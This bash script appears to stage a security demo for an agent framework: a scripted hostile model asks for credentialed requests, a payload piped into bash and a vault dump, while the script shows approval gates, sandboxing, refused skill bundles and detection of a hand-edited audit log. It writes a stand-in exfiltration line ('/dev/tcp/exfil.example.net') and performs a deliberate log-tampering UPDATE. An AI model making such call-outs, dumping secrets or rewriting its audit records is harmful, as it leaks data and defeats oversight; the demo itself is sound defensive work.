#!/usr/bin/env bash
#
# The hostile-model demo, as five verbs. README.md says what each one
# shows and carries the output of a full pass.
#
#   up      everything before the first prompt, silently
#   ask     the one visible run; the presenter answers the prompts
#   skills  the refusal at load
#   verify  the chain, one edit, the chain again
#   down    stop the server, remove the scratch dir
#
# `wirken` comes from PATH unless WIRKEN names another binary. Nothing
# here touches ~/.wirken: WIRKEN_DATA_DIR is set to a scratch dir under
# this folder, and every process resolves the data directory through
# it. Each verb can be run twice.
#
# Each beat prints the OWASP Agentic Top 10 identifiers it exercises,
# on its own line, before its output. The names are quoted from the
# ASI table in docs/security-properties.md.

set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WIRKEN="${WIRKEN:-wirken}"
PORT="${PORT:-8099}"

export WIRKEN_DATA_DIR="$HERE/state"
export WIRKEN_VAULT_PASSPHRASE="demo-passphrase"

DB="$WIRKEN_DATA_DIR/audit.db"
PIDFILE="$WIRKEN_DATA_DIR/hostile_model.pid"
# The chain's signing key lives in the data dir, beside the log it
# signs. `ask` copies it out once the run ends, and `verify` checks
# against the copy, so an edit to the log cannot bring its own key.
SIGNING_KEY="$WIRKEN_DATA_DIR/audit/audit-signing.pub"
ANCHOR="$HERE/anchor.pub"
PROMPT='summarise the release notes'

# Only the four the demo path exercises. `asi` refuses any other, so a
# beat cannot claim ASI03 or anything else by a typo.
declare -A ASI_NAME=(
    [ASI02]="Tool Misuse and Exploitation"
    [ASI04]="Agentic Supply Chain Vulnerabilities"
    [ASI09]="Human-Agent Trust Exploitation"
    [ASI10]="Rogue Agents"
)

die() {
    printf 'stage.sh: %s\n' "$1" >&2
    exit 1
}

# One label line: the identifiers joined, then the name of the last.
# `asi ASI02 ASI09` is "ASI02 · ASI09 Human-Agent Trust Exploitation".
asi() {
    local id joined=""
    for id in "$@"; do
        [ -n "${ASI_NAME[$id]:-}" ] || die "no demo beat exercises $id"
        joined="${joined:+$joined · }$id"
    done
    printf '%s %s\n' "$joined" "${ASI_NAME[${!#}]}"
}

# The pid of a hostile_model.py serving this port, by reading each
# process's argv. Not a pattern kill: `pkill -f hostile_model.py` also
# matches any shell whose own command line mentions it, this one
# included, which is how the first draft killed its caller.
model_pid() {
    python3 - "$PORT" <<'PY'
import os, sys
port = sys.argv[1]
for entry in os.listdir("/proc"):
    if not entry.isdigit():
        continue
    try:
        with open(f"/proc/{entry}/cmdline", "rb") as fh:
            argv = fh.read().split(b"\0")
    except OSError:
        continue
    argv = [a.decode("utf-8", "replace") for a in argv if a]
    if not any(a.endswith("hostile_model.py") for a in argv):
        continue
    if "--port" in argv and argv[argv.index("--port") + 1 :][:1] == [port]:
        print(entry)
        break
PY
}

# One connect attempt, for "is it already up".
listening() {
    python3 - "$PORT" <<'PY'
import socket, sys
probe = socket.socket()
probe.settimeout(0.2)
sys.exit(0 if probe.connect_ex(("127.0.0.1", int(sys.argv[1]))) == 0 else 1)
PY
}

# Connect attempts until it answers or ten seconds pass.
wait_listening() {
    python3 - "$PORT" <<'PY'
import socket, sys, time
port = int(sys.argv[1])
deadline = time.time() + 10
while time.time() < deadline:
    probe = socket.socket()
    probe.settimeout(0.2)
    if probe.connect_ex(("127.0.0.1", port)) == 0:
        sys.exit(0)
    probe.close()
    time.sleep(0.1)
sys.exit(1)
PY
}

# Where an approved `exec` would run, by the same two inputs the agent
# reads: the sandbox mode from sandbox.json (absent means the default,
# ExecOnly) and whether the Docker daemon answers on the default local
# socket. Nothing on the audit chain records this after the fact, so
# `up` says it before anyone answers a prompt.
exec_lands() {
    python3 - "$WIRKEN_DATA_DIR" <<'PY'
import json, pathlib, socket, sys

data_dir = pathlib.Path(sys.argv[1])
mode = "exec_only"
config = data_dir / "sandbox.json"
if config.is_file():
    try:
        mode = str(json.loads(config.read_text()).get("mode", mode)).lower()
    except (OSError, ValueError):
        pass

if mode == "off":
    print("on the host (sandbox mode off)")
    sys.exit(0)

reachable = False
try:
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    sock.settimeout(1.0)
    sock.connect("/var/run/docker.sock")
    sock.sendall(b"GET /version HTTP/1.1\r\nHost: docker\r\n\r\n")
    reachable = b"200 OK" in sock.recv(256)
    sock.close()
except OSError:
    reachable = False

if reachable:
    print(f"in a Docker container (sandbox mode {mode})")
else:
    print(f"nowhere: sandbox mode {mode} and Docker is not reachable, so exec is refused")
PY
}

# The row the edit lands on: the model's exec call as the chain
# recorded it. Every `ask` writes one, whatever the presenter answers,
# and it is still an exec call after the edit, so a second `verify`
# finds the same row.
target_seq() {
    sqlite3 "$DB" "SELECT MIN(seq) FROM session_events
                    WHERE json_extract(payload, '\$.kind') = 'assistant_tool_calls'
                      AND payload LIKE '%\"name\":\"exec\"%';"
}

# `audit verify` exits 1 on a broken chain, which is an answer and not
# an error, so it runs outside `set -e`. The anchor warning is the same
# paragraph every time; `quiet` leaves it out of the second block.
run_verify() {
    local rc=0
    if [ "${1:-}" = quiet ]; then
        local report
        report="$("$WIRKEN" audit verify --require-signed --anchor "$ANCHOR")" || rc=$?
        printf '%s\n' "$report" | grep -v '^  WARNING (audit anchor)' || true
    else
        "$WIRKEN" audit verify --require-signed --anchor "$ANCHOR" || rc=$?
    fi
    printf 'exit=%s\n' "$rc"
}

up() {
    mkdir -p "$WIRKEN_DATA_DIR/skills" "$WIRKEN_DATA_DIR/workspace"

    # What turn 2 pipes into bash: a call-out to the same host turn 1
    # tried. The workspace is what an approved exec sees as its working
    # directory, so `./payload.sh` is this. Bash's own /dev/tcp rather
    # than curl, because the default sandbox image has no curl and the
    # line to show is the call-out failing, not a missing binary.
    printf 'exec 3<>/dev/tcp/exfil.example.net/80\n' > "$WIRKEN_DATA_DIR/workspace/payload.sh"

    cat > "$WIRKEN_DATA_DIR/provider.json" <<JSON
{
  "provider": "custom",
  "model": "hostile-demo-1",
  "base_url": "http://127.0.0.1:$PORT/v1"
}
JSON

    # `wirken ask` requires a credential to exist for any non-ollama
    # provider. The scripted server never reads it.
    if ! "$WIRKEN" credentials list 2>/dev/null | grep -q 'custom-api-key'; then
        printf 'not-a-real-key\n' \
            | "$WIRKEN" credentials add custom-api-key --stdin >/dev/null 2>&1
    fi

    for bundle in demo-tampered demo-selfsigned; do
        rm -rf "${WIRKEN_DATA_DIR:?}/skills/$bundle"
        cp -r "$HERE/skills/$bundle" "$WIRKEN_DATA_DIR/skills/$bundle"
    done

    "$WIRKEN" skills trust-root "$(cat "$HERE/registry-root.pub")" >/dev/null 2>&1

    local running
    running="$(model_pid)"
    if [ -z "$running" ]; then
        # Something else on the port is not ours to adopt or to kill.
        ! listening || die "port $PORT is busy and it is not hostile_model.py"
        python3 "$HERE/hostile_model.py" --port "$PORT" \
            >"$WIRKEN_DATA_DIR/hostile_model.log" 2>&1 &
        running=$!
    fi
    printf '%s\n' "$running" > "$PIDFILE"
    wait_listening || die "the hostile model did not answer on port $PORT"

    # The version of whichever binary the verbs will run, so a stale
    # one on PATH shows before the first prompt rather than after.
    local version
    version="$("$WIRKEN" --version | awk 'NR == 1 { print $2 }')"
    [ -n "$version" ] || die "$WIRKEN did not report a version"

    printf 'ready: wirken %s, scratch %s, hostile model on 127.0.0.1:%s, approved exec runs %s\n' \
        "$version" "$WIRKEN_DATA_DIR" "$PORT" "$(exec_lands)"
}

# The approval gate attaches only when stdin is a terminal, so this
# runs in the foreground with the presenter's stdin. RUST_LOG is set
# here rather than on stage: without it every LLM call also prints
# `no pricing entry for (provider, model)`, because hostile-demo-1 is
# not in the baked pricing table.
#
# The trace sits on wirken's output and reads the chain as the run
# appends to it. Each `assistant_tool_calls` row is a call arriving
# from the model, and it prints that call's label. The row is written
# before the call reaches the gate, so reading the chain before
# passing on each chunk of output puts every label above the prompt
# it belongs to. Turn 1 is refused without a prompt and prints
# nothing of its own, so the trace also prints the reason the chain
# records for it. After an approval it prints what the chain says
# came of it: where an exec ran and the first line it wrote, or that
# the tool was not found.
ask() {
    listening || die "no hostile model on port $PORT; run 'up' first"
    # Assigned first: a `die` inside an argument's substitution would
    # not stop the script.
    local credential pipeline unknown
    credential="$(asi ASI02)"
    pipeline="$(asi ASI02 ASI09)"
    unknown="$(asi ASI10)"
    local rc=0
    RUST_LOG=wirken=error python3 - "$DB" "$WIRKEN" "$PROMPT" \
        "http_request=$credential" \
        "exec=$pipeline" \
        "vault_dump_all=$unknown" 3<&0 <<'PY' || rc=$?
import json, os, select, signal, sqlite3, subprocess, sys

db, wirken, prompt, *pairs = sys.argv[1:]
labels = dict(pair.split("=", 1) for pair in pairs)
out = sys.stdout.buffer

def rows(after):
    if not os.path.exists(db):
        return []
    try:
        conn = sqlite3.connect(f"file:{db}?mode=ro", uri=True)
        try:
            return conn.execute(
                "SELECT seq, payload FROM session_events WHERE seq > ? ORDER BY seq",
                (after,),
            ).fetchall()
        finally:
            conn.close()
    except sqlite3.Error:
        return []

# Rows from an earlier `ask` are not this run's calls.
seen = max((seq for seq, _ in rows(-1)), default=-1)
refused = set()

def trace():
    global seen
    for seq, payload in rows(seen):
        seen = seq
        event = json.loads(payload)
        kind = event.get("kind")
        if kind == "assistant_tool_calls":
            for call in event.get("calls", []):
                if call.get("name") in labels:
                    out.write(f"{labels[call['name']]}\n".encode())
        elif kind == "permission_approved":
            scope = str(event.get("scope", "")).replace("_", "-")
            out.write(f"  approved, {scope}\n".encode())
        elif kind == "tool_result" and event.get("sandbox"):
            box = event["sandbox"]
            first = (event.get("output") or "").splitlines()[:1]
            out.write(f"  ran in {box.get('runtime')} {box.get('container_id')}\n".encode())
            if first:
                out.write(f"  {first[0]}\n".encode())
        elif kind == "tool_result" and str(event.get("output")).startswith("tool not found:"):
            out.write(b"  tool not found\n")
        elif kind == "skill_permission_denied":
            refused.add(event.get("requested"))
        elif kind == "tool_result" and event.get("tool_name") in refused:
            refused.discard(event.get("tool_name"))
            out.write(f"  refused without a prompt: {event.get('output')}\n".encode())
    out.flush()

# This script is on stdin, so the presenter's terminal arrives on fd 3
# and wirken gets it back as stdin, which is what attaches the gate.
# Both output streams come through here so the labels interleave.
child = subprocess.Popen(
    [wirken, "ask", "-m", prompt],
    stdin=3,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
)
# Ctrl-C belongs to wirken; this process waits for it to finish.
signal.signal(signal.SIGINT, signal.SIG_IGN)
fd = child.stdout.fileno()
while True:
    ready, _, _ = select.select([fd], [], [], 0.05)
    trace()
    if not ready:
        continue
    chunk = os.read(fd, 4096)
    if not chunk:
        break
    out.write(chunk)
    out.flush()
trace()
sys.exit(child.wait())
PY
    # The key exists once the run has appended to the chain.
    [ ! -f "$SIGNING_KEY" ] || cp "$SIGNING_KEY" "$ANCHOR"
    return "$rc"
}

# One line per bundle from `skills list`: the table row for a bundle
# that loaded, and for one that did not, the loader's reason with the
# timestamp and the paths cut. The loader logs that reason through
# tracing, which writes to stdout beside the table. NO_COLOR keeps
# escape sequences out of what gets parsed.
skill_lines() {
    NO_COLOR=1 RUST_LOG=wirken_agent::skill=debug "$WIRKEN" skills list 2>/dev/null \
        | python3 -c '
import re, sys
for line in sys.stdin:
    refused = re.search(r"skills/([^/]+)/SKILL\.md: skill load error: .* failed: (.*?)\. ", line)
    if refused:
        print(f"  {refused[1]:<17} refused: {refused[2]}")
        continue
    row = re.match(r"\s+(demo-\S+)\s.*\s(\S+)\s*$", line)
    if row:
        print(f"  {row[1]:<17} loads, {row[2]}")
'
}

# Twice: once with the registry root moved aside, so only the
# self-signed floor applies, and once with it back. A root left aside
# by an interrupted run is put back first.
skills() {
    local root="$WIRKEN_DATA_DIR/registry-root.pub"
    [ ! -f "$root.aside" ] || mv "$root.aside" "$root"
    [ -f "$root" ] || die "no registry root in the scratch dir; run 'up' first"
    asi ASI04
    mv "$root" "$root.aside"
    skill_lines
    mv "$root.aside" "$root"
    printf '\n'
    skill_lines
}

verify() {
    [ -f "$DB" ] || die "no audit log yet; run 'ask' first"
    [ -f "$ANCHOR" ] || die "no anchor outside the data dir; run 'ask' first"
    local seq
    seq="$(target_seq)"
    # The edit rewrites what the model asked for: the pipe into bash
    # goes, and the call reads as a look at a file.
    [ -n "$seq" ] || die "no exec call on the chain; run 'ask' first"

    asi ASI10
    printf -- '── the chain as written ──\n'
    run_verify
    # Where each exec ran, from the row that records it. Absent means
    # the call never ran, which is what the n path produces.
    sqlite3 "$DB" \
        "SELECT '  exec at seq ' || seq || ': sandbox=' ||
                COALESCE(json_extract(payload, '\$.sandbox'), 'absent')
           FROM session_events
          WHERE json_extract(payload, '\$.kind') = 'tool_result'
            AND json_extract(payload, '\$.tool_name') = 'exec'
          ORDER BY seq;"

    printf -- '\n── one UPDATE at seq %s ──\n' "$seq"
    sqlite3 "$DB" \
        "UPDATE session_events
            SET payload = replace(payload, '| bash', ' ')
          WHERE seq = $seq;"
    sqlite3 "$DB" \
        "SELECT seq || '|' || json_extract(payload, '\$.calls[0].arguments')
           FROM session_events WHERE seq = $seq;"

    printf -- '\n── the chain after the edit ──\n'
    run_verify quiet
}

# Stops whatever hostile_model.py is on the port, not only the pid
# this script wrote: an `up` from another shell leaves a server whose
# pidfile a later `down` has already removed with the scratch dir.
down() {
    local running
    running="$(model_pid)"
    [ -n "$running" ] || running="$(cat "$PIDFILE" 2>/dev/null || true)"
    [ -z "$running" ] || kill "$running" 2>/dev/null || true
    [ "$WIRKEN_DATA_DIR" = "$HERE/state" ] || die "refusing to remove $WIRKEN_DATA_DIR"
    rm -rf "${WIRKEN_DATA_DIR:?}"
    rm -f "$ANCHOR"
    printf 'stopped: hostile model down, scratch removed\n'
}

case "${1:-}" in
    up | ask | skills | verify | down) "$1" ;;
    *)
        printf 'usage: %s {up|ask|skills|verify|down}\n' "${0##*/}" >&2
        exit 2
        ;;
esac
